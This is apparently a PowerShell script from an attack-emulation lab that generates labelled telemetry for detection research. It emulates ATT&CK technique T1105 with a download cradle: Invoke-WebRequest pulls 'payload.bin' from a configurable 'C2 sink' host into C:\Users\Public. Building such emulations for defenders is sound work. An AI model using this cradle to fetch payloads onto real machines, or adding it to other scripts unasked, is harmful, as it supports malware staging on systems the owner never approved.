<#
  03 — INGRESS TOOL TRANSFER  (tactic: Command & Control)
  Technique: T1105 — pull a payload onto the host.
  Implemented as a CUSTOM step so the download target is YOUR sink (controlled, reproducible),
  which guarantees a process->network and a file-write edge you can label precisely.
  Observable nodes: process (powershell.exe) + network (sink) + file (downloaded payload).
  Admin required: no.

  Point it at a running Start-LocalSink.ps1 (see lib\). Env override: $env:C2_SINK_HOST / _PORT.
#>
. "$PSScriptRoot\..\lib\attack-lib.ps1"
Initialize-AttackLab

$SinkHost = if ($env:C2_SINK_HOST) { $env:C2_SINK_HOST } else { "10.21.2.10" }
$SinkPort = if ($env:C2_SINK_PORT) { [int]$env:C2_SINK_PORT } else { 8888 }
$outFile  = "C:\Users\Public\downloaded_tool.bin"

Invoke-LabeledStep -Technique "T1105" -Tactic "command-and-control" `
    -ProcessIndicators @("powershell.exe") `
    -FileIndicators @($outFile) `
    -NetworkIndicators @("${SinkHost}:${SinkPort}") `
    -Note "Download cradle from sink" -Action {
        # $($SinkHost) subexpression avoids PowerShell parsing "$SinkHost:" as a scope.
        $uri = "http://$($SinkHost):$($SinkPort)/payload.bin"
        try { Invoke-WebRequest -Uri $uri -OutFile $outFile -UseBasicParsing -TimeoutSec 5 }
        catch { Write-Warning "download failed (sink down?) — connection attempt still generated network telemetry" }
    }
